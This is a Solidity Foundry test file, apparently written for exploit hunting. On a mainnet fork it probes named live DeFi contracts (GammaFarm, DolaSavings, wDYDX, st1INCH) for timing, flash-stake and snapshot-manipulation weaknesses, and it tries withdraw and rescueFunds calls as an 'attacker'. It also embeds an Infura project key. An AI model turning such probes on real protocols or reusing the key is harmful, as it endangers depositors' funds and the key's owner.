// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";

/**
 * @title Flash Loan Exploit
 * @notice Test flash loan attacks on DeFi contracts
 */
contract FlashLoanExploitTest is Test {

    address WETH;
    address USDC;
    address DAI;
    address AAVE_POOL;
    address attacker;

    function setUp() public {
        vm.createSelectFork("https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c");
        WETH = vm.parseAddress("0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2");
        USDC = vm.parseAddress("0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48");
        DAI = vm.parseAddress("0x6B175474E89094C44Da98b954EedeAC495271d0F");
        AAVE_POOL = vm.parseAddress("0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2");
        attacker = address(this);
    }

    function test_analyzeGammaFarm() public {
        // GammaFarm - 0x5Dc58f812b2e244DABA2fabd33f399cD699D7Ddc
        address target = vm.parseAddress("0x5Dc58f812b2e244DABA2fabd33f399cD699D7Ddc");

        console.log("=== GAMMAFARM DEEP ANALYSIS ===");

        // Check stakingToken
        (bool s, bytes memory d) = target.staticcall(
            abi.encodeWithSignature("stakingToken()")
        );
        if (s && d.length >= 32) {
            address stakingToken = abi.decode(d, (address));
            console.log("Staking Token:", stakingToken);
        }

        // Check rewardToken
        (s, d) = target.staticcall(
            abi.encodeWithSignature("rewardToken()")
        );
        if (s && d.length >= 32) {
            address rewardToken = abi.decode(d, (address));
            console.log("Reward Token:", rewardToken);
        }

        // Check if there's a profitFactor that can be exploited
        (s, d) = target.staticcall(
            abi.encodeWithSignature("profitFactor()")
        );
        if (s && d.length >= 32) {
            uint256 pf = abi.decode(d, (uint256));
            console.log("Profit Factor:", pf);
        }

        // Check pending rewards mechanism
        (s, d) = target.staticcall(
            abi.encodeWithSignature("pendingRewards(address)", attacker)
        );
        if (s && d.length >= 32) {
            uint256 pending = abi.decode(d, (uint256));
            console.log("Pending Rewards:", pending);
        }

        // Check if we can stake and immediately claim
        console.log("");
        console.log("Testing stake/claim timing attack...");

        // Give ourselves some tokens
        vm.deal(attacker, 100 ether);

        // Check balance of GammaFarm in WETH
        (s, d) = WETH.staticcall(
            abi.encodeWithSignature("balanceOf(address)", target)
        );
        if (s && d.length >= 32) {
            uint256 bal = abi.decode(d, (uint256));
            console.log("GammaFarm WETH balance:", bal / 1e18);
        }
    }

    function test_analyzeDolaSavings() public {
        // DolaSavings - 0xE5f24791E273Cb96A1f8E5B67Bc2397F0AD9B8B4
        address target = vm.parseAddress("0xE5f24791E273Cb96A1f8E5B67Bc2397F0AD9B8B4");

        console.log("=== DOLASAVINGS DEEP ANALYSIS ===");

        // Get DBR token
        (bool s, bytes memory d) = target.staticcall(
            abi.encodeWithSignature("dbr()")
        );
        address dbr;
        if (s && d.length >= 32) {
            dbr = abi.decode(d, (address));
            console.log("DBR:", dbr);
        }

        // Get DOLA token
        (s, d) = target.staticcall(
            abi.encodeWithSignature("dola()")
        );
        address dola;
        if (s && d.length >= 32) {
            dola = abi.decode(d, (address));
            console.log("DOLA:", dola);
        }

        // Check yield rate
        (s, d) = target.staticcall(
            abi.encodeWithSignature("yearlyRewardBudget()")
        );
        if (s && d.length >= 32) {
            uint256 budget = abi.decode(d, (uint256));
            console.log("Yearly Reward Budget:", budget / 1e18);
        }

        // Check if we can flash stake
        console.log("");
        console.log("Testing flash stake vulnerability...");

        // Check maxYearlyRewardBudget
        (s, d) = target.staticcall(
            abi.encodeWithSignature("maxYearlyRewardBudget()")
        );
        if (s && d.length >= 32) {
            uint256 maxBudget = abi.decode(d, (uint256));
            console.log("Max Yearly Budget:", maxBudget / 1e18);
        }

        // Check getDbrReserve
        (s, d) = target.staticcall(
            abi.encodeWithSignature("getDbrReserve()")
        );
        if (s && d.length >= 32) {
            uint256 reserve = abi.decode(d, (uint256));
            console.log("DBR Reserve:", reserve / 1e18);
        }
    }

    function test_analyzeWDYDX() public {
        // wDYDX - 0x46b2DeAe6eFf3011008EA27EA36b7c27255ddFA9
        address target = vm.parseAddress("0x46b2DeAe6eFf3011008EA27EA36b7c27255ddFA9");

        console.log("=== WDYDX DEEP ANALYSIS ===");

        // Check snapshot mechanism
        (bool s, bytes memory d) = target.staticcall(
            abi.encodeWithSignature("_nextAvailableSnapshotId()")
        );
        if (s && d.length >= 32) {
            uint128 nextId = abi.decode(d, (uint128));
            console.log("Next Snapshot ID:", uint256(nextId));
        }

        // Get total supply
        (s, d) = target.staticcall(
            abi.encodeWithSignature("totalSupply()")
        );
        if (s && d.length >= 32) {
            uint256 ts = abi.decode(d, (uint256));
            console.log("Total Supply:", ts / 1e18);
        }

        // Check if we can manipulate snapshots
        console.log("");
        console.log("Testing snapshot manipulation...");

        // Check getExchangeRate
        (s, d) = target.staticcall(
            abi.encodeWithSignature("getExchangeRateSnapshot(uint256)", 0)
        );
        if (s && d.length >= 32) {
            console.log("Exchange rate snapshot 0 data length:", d.length);
        }
    }

    function test_st1INCHExploit() public {
        // st1INCH - 0x9A0C8Ff858d273f57072D714bca7411D717501D7
        address target = vm.parseAddress("0x9A0C8Ff858d273f57072D714bca7411D717501D7");

        console.log("=== ST1INCH EXPLOIT TEST ===");

        // Check 1INCH token address
        (bool s, bytes memory d) = target.staticcall(
            abi.encodeWithSignature("oneInch()")
        );
        address oneInch;
        if (s && d.length >= 32) {
            oneInch = abi.decode(d, (address));
            console.log("1INCH Token:", oneInch);
        }

        // Check total staked
        (s, d) = target.staticcall(
            abi.encodeWithSignature("totalSupply()")
        );
        if (s && d.length >= 32) {
            uint256 ts = abi.decode(d, (uint256));
            console.log("Total staked:", ts / 1e18);
        }

        // Check if there's a reward mechanism
        (s, d) = target.staticcall(
            abi.encodeWithSignature("resolvers(address)", attacker)
        );
        if (s && d.length > 0) {
            console.log("Resolver data exists");
        }

        // Try withdraw (we saw this succeeded earlier)
        console.log("");
        console.log("Testing withdraw call...");

        (s,) = target.call(abi.encodeWithSignature("withdraw()"));
        console.log("withdraw():", s ? "SUCCESS" : "FAILED");

        // Check what happens on rescueFunds
        (s,) = target.call(abi.encodeWithSignature("rescueFunds(address,uint256)", WETH, 1 ether));
        console.log("rescueFunds:", s ? "SUCCESS" : "FAILED");
    }
}
